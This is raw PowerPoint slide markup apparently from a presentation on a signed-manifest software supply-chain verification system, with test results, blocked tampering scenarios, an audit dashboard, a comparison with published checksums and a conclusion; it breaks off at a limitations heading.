                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>9 / 9</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="438912"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required test cases passed</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2496312"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96312" y="1481328"/>
            <a:ext cx="1984248" cy="754380"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1A7F4B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>7 / 7</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TextBox 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2569464"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attacks blocked (100 %)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Rounded Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4626864"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26864" y="1481328"/>
            <a:ext cx="1984248" cy="754380"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="B42318"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>0 %</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4700016"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false acceptance rate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rounded Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6757416"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57416" y="1481328"/>
            <a:ext cx="1984248" cy="754380"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>1.89 ms</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6830568"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mean verification time</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="17" name="Table 16"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="365760" y="2926080"/>
          <a:ext cx="8412480" cy="3291840"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="0" bandRow="0"/>
              <a:tblGrid>
                <a:gridCol w="457200"/>
                <a:gridCol w="3291840"/>
                <a:gridCol w="1463040"/>
                <a:gridCol w="3200400"/>
              </a:tblGrid>
              <a:tr h="329184">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a: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00" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Attack / condition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00" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Expected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00" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Actual (status)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329184">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>1</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Valid artifact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1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>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1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>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29184">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>2</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Modified artifact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BLOCKED (HASH_MISMATCH)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29184">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>3</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Invalid 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BLOCKED (INVALID_SIGNATURE)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29184">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>4</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Wrong public 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BLOCKED (UNAUTHORIZED_KEY)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29184">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>5</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Revoked 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BLOCKED (REVOKED)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29184">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>6</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Modified manifest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BLOCKED (INVALID_SIGNATURE)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29184">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>7</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Replay old version 0.8.0</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B42318"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>BLOCKED (revoked version)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29184">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>8</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Unauthorised signer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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="B42318"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>BLOCKED (UNAUTHORIZED_KEY)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29184">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1100" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>9</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Valid new release (key v2)</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1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>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Audit Log &amp; Dashboard</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="dashboard.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1371600"/>
            <a:ext cx="5760720" cy="3600450"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rounded Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="1371600"/>
            <a:ext cx="2468880" cy="3602736"/>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0" y="1426464"/>
            <a:ext cx="2286000" cy="3520440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>What it shows</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1250" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Total events, deploys, attacks blocked, FAR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1250" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit trail with status badges</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1250" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Key revocation list (CRL)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1250" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Live "Verify Legitimate Artifact" button</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="5120640"/>
            <a:ext cx="8412480" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1050" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>audit_logs(timestamp, artifact, version, sha256, key_id, verification_result, user_process, action, rejection_reason)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>python dashboard/app.py   →   http://127.0.0.1:5000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Innovation &amp; Industry Relevance</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="365760" y="1371600"/>
          <a:ext cx="8412480" cy="3145536"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="0" bandRow="0"/>
              <a:tblGrid>
                <a:gridCol w="3291840"/>
                <a:gridCol w="2194560"/>
                <a:gridCol w="2926080"/>
              </a:tblGrid>
              <a:tr h="393192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1200" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Capability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200" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Published checksum</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200" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Our system</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393192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1200" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Detects a modified artifact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0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Only if checked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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes: always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93192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1200" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Survives a compromised bucket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0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00" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes: attacker cannot sign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93192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1200" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Rejects rogue signers / keys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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes: policy + trusted keys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93192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1200" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Handles leaked keys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0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00" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes: CRL, signer + verifier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93192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1200" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Blocks replay of old versions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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes: revoked / min version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93192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1200" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Ties release to its build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0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00" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes: SLSA-style provenance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93192">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1200" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Automatic CI enforcement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1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="B42318"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>No: manual</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00" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="1A7F4B"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Yes: exit 0 / exit 1 gate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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rounded Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="4709160"/>
            <a:ext cx="4114800" cy="1234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4754880"/>
            <a:ext cx="393192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Industry alignment</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="5102352"/>
            <a:ext cx="3931920" cy="82296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US EO 14028 · NIST SSDF (SP 800-218) · SLSA provenance · Sigstore / TUF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="4709160"/>
            <a:ext cx="4114800" cy="1234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73168" y="4754880"/>
            <a:ext cx="393192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Cost &amp; feasibility</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="5102352"/>
            <a:ext cx="3931920" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Open-source (Python, PyCA, SQLite, Flask) · ms per check · one KMS key in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Conclusion</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1371600"/>
            <a:ext cx="8412480" cy="11430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417320"/>
            <a:ext cx="8138160" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1A7F4B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>LEGITIMATE SOFTWARE → VERIFIED → DEPLOYED</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="B42318"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>TAMPERED SOFTWARE → DETECTED → BLOCKED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="2697480"/>
            <a:ext cx="2697480" cy="3520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5488" y="2743200"/>
            <a:ext cx="2468880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Achieved</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="3154680"/>
            <a:ext cx="2514600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SHA-256 + Ed25519 signed manifest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CRL, zero-trust policy, provenance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Fail-closed CI gate (exit 0/1)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit log + dashboard; 9/9 tests</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rounded Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="2697480"/>
            <a:ext cx="2697480" cy="3520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310128" y="2743200"/>
            <a:ext cx="2468880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Limitations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
